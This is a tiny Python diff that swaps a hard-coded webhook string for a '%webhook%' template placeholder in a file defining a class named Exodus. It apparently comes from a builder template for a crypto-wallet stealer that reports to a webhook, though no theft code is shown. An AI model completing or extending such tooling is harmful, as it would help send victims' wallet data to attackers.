@@ -1,6 +1,6 @@
 from libs.libs import *
 
-webhook = 'webhookhere'
+webhook = '%webhook%'
 
 class Exodus:
     def __init__(self, webhook):
